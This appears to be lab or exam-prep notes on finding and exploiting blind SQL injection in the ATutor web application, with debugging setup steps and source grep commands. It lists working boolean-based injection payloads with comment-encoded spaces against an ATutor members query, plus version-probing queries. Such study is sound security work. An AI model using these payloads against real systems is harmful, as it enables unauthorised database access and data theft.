### Turn on Errors in PHP

> sudo nano /etc/php5/apache2/php.ini 
> Search (ctrl+w) for "display_errors = " and change Off to On
> sudo systemctl restart apache2

### Turn on logging in MySQL

> sudo nano /etc/mysql/my.cnf 
> Search (ctrl+w) for "general_log_file", enable this and general_log
> sudo systemctl restart mysql

Monitor MySQL Queries:
> tail -f /var/log/mysql/mysql.log

### Grep search: 
> grep -rnw /var/www/html/ATutor -e "^.*user_location.*public.*" --color

### Information Gathering

> echo "<?php var_dump(get_magic_quotes_gpc()); ?>" > info.php
> echo "<?php echo 'PHP Version: ' . phpversion().\"\r\n\"; ?>" >> info.php

### SQL inline comments to replace spaces

> mysql> select/**/1;

### SQL Blind Injection Payloads

%23 is # sign, interpreted by MySQL as a comment, terminating the rest of the query

True:
> AAAA')/**/or/**/(select/**/1)=1%23

> select count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/OR/**/ (select/**/1)=1#

False:
> AAAA')/**/or/**/(select/**/1)=0%23

> select count(*) FROM AT_members M WHERE (first_name LIKE '%AAAA')/**/OR/**/ (select/**/1)=0#

### Boolean based MySQL queries for use in blind injections

Establish the verison:

Is the version 4.xxxxx?
> select/**/(substring((select/**/version()),1,1))=4;

Or 5.xxxx?
> select/**/(substring((select/**/version()),1,1))=5;

